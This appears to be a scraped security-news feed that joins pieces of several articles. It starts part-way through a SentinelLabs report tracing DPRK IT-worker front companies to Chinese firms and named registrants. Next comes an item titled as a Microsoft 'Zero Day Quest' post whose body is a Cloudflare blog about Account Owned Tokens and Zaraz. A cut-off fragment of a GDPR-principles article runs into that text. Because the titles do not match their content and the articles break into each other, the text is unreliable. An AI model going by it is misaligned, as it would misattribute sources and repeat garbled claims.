&lt;figure class="wp-caption aligncenter" id="attachment_109233" style="width: 1999px;"&gt;&lt;img alt="Domain Seized Alert - English" class="size-full wp-image-109233" height="1128" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_8.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109233"&gt;Domain Seized Alert &amp;#8211; English&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109240" style="width: 1999px;"&gt;&lt;img alt="Domain Seized Alert - Korean" class="size-full wp-image-109240" height="1124" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_19.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109240"&gt;Domain Seized Alert &amp;#8211; Korean&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Expanded Analysis&lt;/h2&gt;
&lt;p&gt;Drawing on details from the four companies disrupted by US Government agencies, SentinelLabs was able to find multiple leads to an active network of DPRK IT front companies originating in China.&lt;/p&gt;
&lt;h3&gt;The Mysterious A1 Building&lt;/h3&gt;
&lt;p&gt;In an early 2024 archived snapshot of Shenyang Tonywang Technology’s website, &lt;code&gt;tonywangtech[.]com&lt;/code&gt;, we can see the actor added the following address:&lt;/p&gt;
&lt;p&gt;&lt;i&gt;No. 1006-25, Building A1, No. 11, Tawan Street, Huanggu District, Shenyang City Liaoning 110036&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class="wp-caption aligncenter" id="attachment_109248" style="width: 1999px;"&gt;&lt;img alt="tonywangtech[.]com listed address and contact details" class="size-full wp-image-109248" height="1022" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_10.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109248"&gt;tonywangtech[.]com listed address and contact details&lt;/figcaption&gt;&lt;/figure&gt;We identified an additional company with similar traits. First, the address happens to be highly close in proximity – listed next to each other on the same floor of the same building. &lt;i&gt;No. 1006-23, Building A1, No. 11, Tawan Street, Huanggu, Shenyang, Liaoning, China&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;The additional company is Shenyang Huguo Technology Ltd, which uses the domain &lt;code&gt;huguotechltd[.]com&lt;/code&gt; in a similar way to the previous four. The website uses copied content and logos from the legitimate Indian software firm TatvaSoft.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109238" style="width: 1999px;"&gt;&lt;img alt="Active DPRK linked company website -Shenyang Huguo Technology Ltd" class="size-full wp-image-109238" height="1065" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_3.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109238"&gt;Active DPRK linked company website -Shenyang Huguo Technology Ltd&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The &lt;code&gt;huguotechltd[.]com&lt;/code&gt; domain was registered in October 2023 via NameCheap. The domain has since been and continues to be hosted at &lt;code&gt;103.15.29[.]44&lt;/code&gt;, of Asia Web Services Ltd.&lt;/p&gt;
&lt;p&gt;We assess Shenyang Huguo Technology Ltd. is closely associated with the previously four reviewed DPRK IT Worker front companies, and had remained online long enough to have been used to achieve the DPRKs objectives.&lt;/p&gt;
&lt;h3&gt;The Tony Wang Link&lt;/h3&gt;
&lt;p&gt;HopanaTech’s website, &lt;code&gt;hopanatech[.]com&lt;/code&gt;, listed three contacts before it was taken down by law enforcement. The first person, Wang Kejia, is listed with the email address “Tonywkj”.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109245" style="width: 1058px;"&gt;&lt;img alt="Contacts from the now-seized HopanaTech website" class="size-full wp-image-109245" height="738" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_14.jpg" width="1058" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109245"&gt;Contacts from the now-seized HopanaTech website&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The “wkj” is almost certainly the acronym for the preceding Chinese name, Wang Kejia. The &lt;code&gt;Tonywkj@Hopana&lt;/code&gt; email address establishes a link between Wang Kejia, a real person who is a resident of the address in New Jersey and the “Tony Wang” identity. The Shenyang Tonywang Technology Company website discussed above was also subject to law enforcement action, and its name bears resemblance to the same Tongwkj listed by Hopana. Furthermore, the Tonywkj email also directly matches the domain of another taken-down DPRK IT Worker site discussed above, Tony WKJ LLC.&lt;/p&gt;
&lt;h3&gt;The Tong Yuze Identity&lt;/h3&gt;
&lt;p&gt;Law enforcement action established that Hopana Tech and &lt;code&gt;Hopanatech[.]com&lt;/code&gt; are DRPK IT Worker Front companies. This analysis expands on the Hopana Tech company corporate registration data inside China.&lt;/p&gt;
&lt;p&gt;A corporate records website from the PRC indicates the Beijing Xiwang Technology Company (北京市戏网科技有限公司), previously used the name Beijing Hou Pa Na Technology Company (北京后帕纳科技有限公司), a clear cognate for the English-translated “HopanaTech.”&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109232" style="width: 1838px;"&gt;&lt;img alt="Corporate record showing Xiwang’s previous use of the Hopana Technology name" class="size-full wp-image-109232" height="556" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_9.jpg" width="1838" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109232"&gt;Corporate record showing Xiwang’s previous use of the Hopana Technology name&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Furthermore, the above screenshot of HopanaTech’s website, which lists the Tonywkj email address, also lists Tong Yuze (佟雨泽). The same name is used for the corporate registrant of Beijing Xiwang Technology Company.Highlighted text shows that Beijing Xiwang Technology was previously known as Hopana Tech.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109247" style="width: 1999px;"&gt;&lt;img alt="Contacts from the now-seized HopanaTech website" class="size-full wp-image-109247" height="969" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_12.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109247"&gt;Contacts from the now-seized HopanaTech website&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;As if to allay concerns that Beijing Xiwang Technology Company was not a front company, corporate records show the firm only pays unemployment insurance, health insurance, and employee injury liability insurance for one person.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109243" style="width: 1999px;"&gt;&lt;img alt="Corporate records for Bejing Xiwang Technology Company" class="size-full wp-image-109243" height="449" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_16.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109243"&gt;Corporate records for Bejing Xiwang Technology Company&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Tong Yuze is currently listed as the corporate registrant of 25 companies in China, including many restaurants and catering companies. Owing to increased data protection measures by the PRC, a complete accounting of Tong Yuze’s companies is not possible.&lt;/p&gt;
&lt;p&gt;Some companies identified as Tong Yuze’s include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;海口宜路畅佟科技贸易有限公司&lt;/li&gt;
&lt;li&gt;北京上日清新食品有限公司&lt;/li&gt;
&lt;li&gt;京山味诚（北京）餐饮管理有限公司&lt;/li&gt;
&lt;li&gt;泽日启程（北京）餐饮管理有限公司&lt;/li&gt;
&lt;li&gt;北京哈巴萨科贸有限公司&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This foray into restaurants does not appear to be a case of mistaken identity. The email provided for Tong Yuze on the registration of Beijing Xiwang Technology Company is &lt;code&gt;tongyuze@jswc[.]com[.]cn&lt;/code&gt;. The email domain “JSWC” aligns with the name of some of Tong Yuze’s restaurant companies. In this case, Jing Shan Wei Cheng (京山味诚), matches the acronym of the email domain. This provides reasonable evidence of a legitimate connection between Tong Yuze and the mentioned food service companies.&lt;/p&gt;
&lt;p&gt;Given the very real businesses being run by Tong Yuze’s other corporate registrations– seemingly many franchises of Yiwei Yicheng (一味一诚) –it’s possible this individual is serving as a cut-out for the DPRK. We hypothesize that his collection of businesses may serve to provide cover for illegal ones.&lt;/p&gt;
&lt;h3&gt;The Haikou Yilu Changtong Technology Trading Company&lt;/h3&gt;
&lt;p&gt;One of the companies connected to the Tong Yuze identity and accessible on corporate registration sites is Haikou Yilu Changtong Technology Trading Company (海口宜路畅佟科技贸易有限公司).&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109249" style="width: 1844px;"&gt;&lt;img alt="Haikou Yilu Changtong Technology Trading Company corporate registration" class="size-full wp-image-109249" height="472" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_1.jpg" width="1844" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109249"&gt;Haikou Yilu Changtong Technology Trading Company corporate registration&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Haikou Yilu is distinct from the other Tong Yuze-registered companies for two reasons. First, it is another technology company–not a restaurant. Second, its corporate registration makes use of a telephone number that differs from Tong Yuze’s restaurant businesses but is shared with the Beijing Xiwang Technology Company corporate registration.&lt;/p&gt;
&lt;p&gt;To help visualize the connections we described, the graphic below provides a simplified representation of the key relationships and pivots.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109242" style="width: 1999px;"&gt;&lt;img alt="Visual representation of front company connections" class="magnify" height="1047" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_17.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109242"&gt;Visual representation of front company connections&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The DPRK&amp;#8217;s use of the IT Worker scheme underscores the regime&amp;#8217;s adaptability in exploiting global markets to further its financial objectives. By impersonating legitimate U.S.-based software and technology consulting firms, North Korean actors aim to gain trust and access to sensitive contracts, circumventing sanctions and evading detection. These tactics highlight a deliberate and evolving strategy that leverages the global digital economy to fund state activities, including weapons development.&lt;/p&gt;
&lt;p&gt;Our research not only exposes the deceptive tactics employed by DPRK IT workers but also connects these efforts to a broader, active network of front companies originating in China. This linkage emphasizes the scale and complexity of North Korea’s financial schemes and the importance of vigilance across industries. Organizations are urged to implement robust vetting processes, including careful scrutiny of potential contractors and suppliers, to mitigate risks and prevent inadvertent support of such illicit operations. By shedding light on these activities, SentinelLabs aims to equip businesses, governments, and the public with the insights needed to stay ahead of these threats and safeguard the integrity of global markets.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&amp;p=109228</guid><category>China</category><category>DPRK</category></item><item><title>Securing AI and Cloud with the Zero Day Quest</title><link>https://msrc.microsoft.com/blog/2024/11/securing-ai-and-cloud-with-the-zero-day-quest/</link><description>Our security teams work around the clock to help protect every person and organization on the planet from security threats.

Additionally, Zaraz Automation Actions streamlines event tracking and third-party tool integration.</description><content:encoded>&lt;p&gt;In October 2024, we started publishing roundup blog posts to share the latest features and updates from our teams. Today, we are announcing general availability for Account Owned Tokens, which allow organizations to improve access control for their Cloudflare services. Additionally, we are launching Zaraz Automated Actions, which is a new feature designed to streamline event tracking and tool integration when setting up third-party tools. By automating common actions like pageviews, custom events, and e-commerce tracking, it removes the need for manual configurations.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Improving access control for Cloudflare services with Account Owned Tokens&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#improving-access-control-for-cloudflare-services-with-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare is critical infrastructure for the Internet, and we understand that many of the organizations that build on Cloudflare rely on apps and integrations outside the platform to make their lives easier. In order to allow access to Cloudflare resources, these apps and integrations interact with Cloudflare via our API, enabled by access tokens and API keys. Today, the API Access Tokens and API keys on the Cloudflare platform are owned by individual users, which can lead to some difficulty representing services, and adds an additional dependency on managing users alongside token permissions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What’s new about Account Owned Tokens&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-new-about-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;First, a little explanation because the terms can be a little confusing. On Cloudflare, we have both Users and Accounts, and they mean different things, but sometimes look similar. Users are people, and they sign in with an email address. Accounts are not people, they’re the top-level bucket we use to organize all the resources you use on Cloudflare. Accounts can have many users, and that’s how we enable collaboration. If you use Cloudflare for your personal projects, both your User and Account might have your email address as the name, but if you use Cloudflare as a company, the difference is more apparent because your user is “&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;” and the account might be “Example Company”. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5tcNkxDjYz9jAXnfV0bPON/920a9dade7145de2adee21afa43d786e/image13.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;Account Owned Tokens are not confined by the permissions of the creating user (e.g. a user can never make a token that can edit a field that they otherwise couldn’t edit themselves) and are scoped to the account they are owned by. This means that instead of creating a token belonging to the user “&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;”, you can now create a token belonging to the account “Example Company”.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/ibh4sT2wgVLVTgqgv2rtO/eb972a5b1c5fa0f70471631430a8ff91/image8.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;The ability to make these tokens, owned by the account instead of the user, allows for more flexibility to represent what the access should be used for.&lt;/p&gt;&lt;p&gt;Prior to Account Owned Tokens, customers would have to have a user (&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;) create a token to pull a list of Cloudflare zones for their account and ensure their security settings are set correctly as part of a compliance workflow, for example. All of the actions this compliance workflow does are now attributed to joe.smith, and if joe.smith leaves the company and his permissions are revoked, the compliance workflow fails.&lt;/p&gt;&lt;p&gt;With this new release, an Account Owned Token could be created, named “compliance workflow”, with permissions to do this operation independently of &lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;. All actions this token does are attributable to “compliance workflow”. This token is visible and manageable by all the superadmins on your Cloudflare account. If joe.smith leaves the company, the access remains independent of that user, and all super administrators on the account moving forward can still see, edit, roll, and delete the token as needed.&lt;/p&gt;&lt;p&gt;Any long-running services or programs can be represented by these types of tokens, be made visible (and manageable) by all super administrators in your Cloudflare account, and truly represent the service, instead of the users managing the service. Audit logs moving forward will log that a given token was used, and user access can be kept to a minimum.&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Account Owned Tokens can be found on the new “API Tokens” tab under the “Manage Account” section of your Cloudflare dashboard, and any Super Administrators on your account have the capability to create, edit, roll, and delete these tokens. The API is the same, but at a new &lt;code&gt;/account/&amp;lt;accountId&amp;gt;/tokens&lt;/code&gt; endpoint.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/uZFVUp1RRP1NgZli9RAYN/5e2b90bea51b7b45bb25478120fd9024/Screenshot_2024-11-13_at_20.14.43.png" /&gt;
          &lt;/figure&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1kiUi4lsJESJqr9HhgCS92/b4b0a3e955742346a5c945601fff4885/image3.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Why/where should I use Account Owned Tokens?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-where-should-i-use-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;There are a few places we would recommend replacing your User Owned Tokens with Account Owned Tokens:&lt;/p&gt;&lt;p&gt;1. &lt;b&gt;Long-running services that are managed by multiple people:&lt;/b&gt; When multiple users all need to manage the same service, Account Owned Tokens can remove the bottleneck of requiring a single person to be responsible for all the edits, rotations, and deletions of the tokens. In addition, this guards against any user lifecycle events affecting the service. If the employee that owns the token for your service leaves the company, the service’s token will no longer be based on their permissions.&lt;/p&gt;&lt;p&gt;2.&lt;b&gt; Cloudflare accounts running any services that need attestable access records beyond user membership:&lt;/b&gt; By restricting all of your users from being able to access the API, and consolidating all usable tokens to a single list at the account level, you can ensure that a complete list of all API access can be found in a single place on the dashboard, under “Account API Tokens”.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2qtssh6bef5Ne6kugqUUnc/af11e3db733f4f38188988ac42034c26/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;3. &lt;b&gt;Anywhere you’ve created “Service Users”:&lt;/b&gt; “Service Users”, or any identity that is meant to allow multiple people to access Cloudflare, are an active threat surface. They are generally highly privileged, and require additional controls (vaulting, password rotation, monitoring) to ensure non-repudiation and appropriate use. If these operations solely require API access, consolidating that access into an Account Owned Token is safe.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why/where should I use User Owned Tokens?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-where-should-i-use-user-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;There are a few scenarios/situations where you should continue to use User Owned Tokens:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where programmatic access is done by a single person at an external interface:&lt;/b&gt; If a single user has an external interface using their own access privileges at Cloudflare, it still makes sense to use a personal token, so that information access can be traced back to them. (e.g. using a personal token in a data visualization tool that pulls logs from Cloudflare)&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/api/operations/user-user-details"&gt;&lt;b&gt;&lt;u&gt;User level operations&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;b&gt;:&lt;/b&gt; Any operations that operate on your own user (e.g. email changes, password changes, user preferences) still require a user level token.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where you want to control resources over multiple accounts with the same credential:&lt;/b&gt; As of November 2024, Account Owned Tokens are scoped to a single account. In 2025, we want to ensure that we can create cross-account credentials, anywhere that multiple accounts have to be called in the same set of operations should still rely on API Tokens owned by a user.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where we currently do not support a given endpoint:&lt;/b&gt; We are currently in the process of working through a &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;list of our services&lt;/u&gt;&lt;/a&gt; to ensure that they all support Account Owned Tokens. When interacting with any of these services that are not supported programmatically, please continue to use User Owned Tokens.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where you need to do token management programmatically:&lt;/b&gt; If you are in an organization that needs to create and delete large numbers of tokens programmatically, please continue to use User Owned Tokens. In late 2024, watch for the “Create Additional Tokens” template on the Account Owned Tokens Page. This template and associated created token will allow for the management of additional tokens.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4BGL99WFnh4oOgTFhRY5N3/26bca9fa8851729d4128c2836db62c3c/image6.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What does this mean for my existing tokens and programmatic access moving forward?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-does-this-mean-for-my-existing-tokens-and-programmatic-access-moving-forward"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;We do not plan to decommission User Owned Tokens, as they still have a place in our overall access model and are handy for ensuring user-centric workflows can be implemented.&lt;/p&gt;&lt;p&gt;As of November 2024, we’re still working to ensure that ALL of our endpoints work with Account Owned Tokens, and we expect to deliver additional token management improvements continuously, with an expected end date of Q3 2025 to cover all endpoints.&lt;/p&gt;&lt;p&gt;A list of services that support, and do not support, Account Owned Tokens can be found in our &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;documentation.&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What’s next?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-next"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;If Account Owned Tokens could provide value to your or your organization, documentation is available &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;, and you can give them a try today from the “API Tokens” menu in your dashboard.&lt;/p&gt;

            &lt;h2&gt;Zaraz Automated Actions makes adding tools to your website a breeze&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#zaraz-automated-actions-makes-adding-tools-to-your-website-a-breeze"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5DkxlchIDUZbQ15x0H0usK/eb656617c1c83805bda98c7dfe896bda/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/en-gb/application-services/products/zaraz/"&gt;&lt;u&gt;Cloudflare Zaraz&lt;/u&gt;&lt;/a&gt; is a tool designed to manage and optimize third-party tools like analytics, marketing tags, or social media scripts on websites. By loading these third-party services through Cloudflare’s network, Zaraz improves website performance, security, and privacy. It ensures that these external scripts don't slow down page loading times or expose sensitive user data, as it handles them efficiently through Cloudflare's global network, reducing latency and improving the user experience.&lt;/p&gt;&lt;p&gt;Automated Actions are a new product feature that allow users to easily setup page views, custom events, and e-commerce tracking without going through the tedious process of manually setting up triggers and actions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why we built Automated Actions&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-we-built-automated-actions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;An action in Zaraz is a way to tell a third party tool that a user interaction or event has occurred when certain conditions, defined by &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-trigger/"&gt;&lt;u&gt;triggers&lt;/u&gt;&lt;/a&gt;, are met. You create actions from within the tools page, associating them with specific tools and triggers.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6a0xBA0uG55z4mhVkN0aYl/10101523491c68e4f2eec022737d15d4/image12.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Setting up a tool in Zaraz has always involved a few steps: &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-trigger/"&gt;&lt;u&gt;configuring a trigger&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-action/"&gt;&lt;u&gt;linking it to a tool action&lt;/u&gt;&lt;/a&gt; and finally calling &lt;a href="https://developers.cloudflare.com/zaraz/web-api/track/"&gt;&lt;code&gt;&lt;u&gt;zaraz.track()&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;. This process allowed advanced configurations with complex rules, and while it was powerful, it occasionally left users confused — why isn’t calling &lt;code&gt;zaraz.track()&lt;/code&gt; enough? We heard your feedback, and we’re excited to introduce &lt;b&gt;Zaraz Automated Actions&lt;/b&gt;, a feature designed to make Zaraz easier to use by reducing the amount of work needed to configure a tool.&lt;/p&gt;&lt;p&gt;With Zaraz Automated Actions, you can now automate sending data to your third-party tools without the need to create a manual configuration. Inspired by the simplicity of &lt;a href="https://developers.cloudflare.com/zaraz/web-api/ecommerce/"&gt;&lt;code&gt;&lt;u&gt;zaraz.ecommerce()&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, we’ve extended this ease to all Zaraz events, removing the need for manual trigger and action setup. For example, calling &lt;code&gt;zaraz.track(‘myEvent’)&lt;/code&gt; will send your event to the tool without the need to configure any triggers or actions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Getting started with Automated Actions&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#getting-started-with-automated-actions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When adding a new tool in Zaraz, you’ll now see an additional step where you can choose one of three Automated Actions: &lt;b&gt;pageviews&lt;/b&gt;, &lt;b&gt;all other events&lt;/b&gt;, or &lt;b&gt;ecommerce&lt;/b&gt;. These options allow you to specify what kind of events you want to automate for that tool.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1LRtb8XpSukCAgmK7uIA5Y/ab11ae9b58f474d08893b496a0eea764/image7.png" /&gt;
          &lt;/figure&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Pageviews&lt;/b&gt;: Automatically sends data to the tool whenever someone visits a page on your site, without any manual configuration.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;All other events&lt;/b&gt;: Sends all custom events triggered using zaraz.track() to the selected tool, making it easy to automate tracking of user interactions.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Ecommerce&lt;/b&gt;: Automatically sends all e-commerce events triggered via zaraz.ecommerce() to the tool, streamlining your sales and transaction tracking.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;These Automated Actions are also available for all your existing tools, which can be toggled on or off from the tool detail page in your Zaraz dashboard. This flexibility allows you to fine-tune which actions are automated based on your needs.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/xy1tIfYTfOo7p2IUeCS5d/42b26d6cfc4c05d8adc67edfc38ac34c/image10.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Custom actions for tools without Automated Action support&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#custom-actions-for-tools-without-automated-action-support"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Some tools do not support automated actions because the tool itself does not support page view, custom, or e-commerce events. For such tools you can still create your own custom actions, just like before. Custom actions allow you to configure specific events to send data to your tools based on unique triggers. The process remains the same, and you can follow the detailed steps outlined in our&lt;a href="https://developers.cloudflare.com/zaraz/get-started/create-actions/"&gt; &lt;u&gt;Create Actions guide&lt;/u&gt;&lt;/a&gt;. Remember to set up your trigger first, or choose an existing one, before configuring the action.&lt;/p&gt;&lt;h4&gt;Automatically enrich your payload&lt;/h4&gt;&lt;p&gt;When creating a custom action, it is now easier to send Event Properties using the &lt;b&gt;Include Event Properties field.&lt;/b&gt; When this is toggled on, you can automatically send client-specific data with each action, such as user behavior or interaction details. For example, to send an &lt;code&gt;userID&lt;/code&gt; property when sending a &lt;code&gt;click&lt;/code&gt; event you can do something like this: &lt;code&gt;zaraz.track(‘click’, { userID: “foo” })&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Additionally, you can enable the &lt;b&gt;Include System Properties&lt;/b&gt; option to send system-level information, such as browser, operating system, and more. In your action settings click on “Add Field”, pick the “Include System Properties”, click on confirm and then toggle the field on. &lt;/p&gt;&lt;p&gt;For a full list of system properties, visit our&lt;a href="https://developers.cloudflare.com/zaraz/reference/context/"&gt; &lt;u&gt;System Properties reference guide&lt;/u&gt;&lt;/a&gt;. These options give you greater flexibility and control over the data you send with custom actions.&lt;/p&gt;&lt;p&gt;These two fields replace the now deprecated “Enrich Payload” dropdown field.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/73nCsNmeG58p6n0ylxMV8E/5cb87b516aaceb38319f9175dc7ccbf3/image5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Zaraz Automated Actions marks a significant step forward in simplifying how you manage events across your tools. By automating common actions like page views, e-commerce events, and custom tracking, you can save time and reduce the complexity of manual configurations. Whether you’re leveraging Automated Actions for speed or creating custom actions for more tailored use cases, Zaraz offers the flexibility to fit your workflow. &lt;/p&gt;&lt;p&gt;We’re excited to see how you use this feature.

When I asked data privacy trainer and DPO (data protection officer) Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one. In part, this is due to how the principles naturally interlink – an issue with one principle naturally leads to issues with (some of) the others, too.

&lt;p&gt;&lt;em&gt;At the heart of the &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;GDPR (General Data Protection Regulation)&lt;/em&gt;&lt;/a&gt;&lt;em&gt; lie the Article 5 data protection principles.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;When I asked &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/gdpr-training" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;data privacy trainer&lt;/em&gt;&lt;/a&gt;&lt;em&gt; and &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;DPO (data protection officer)&lt;/em&gt;&lt;/a&gt;&lt;em&gt; Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one.

&lt;p&gt;&lt;em&gt;Andy took the first principle as an example, saying:&lt;/em&gt;&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
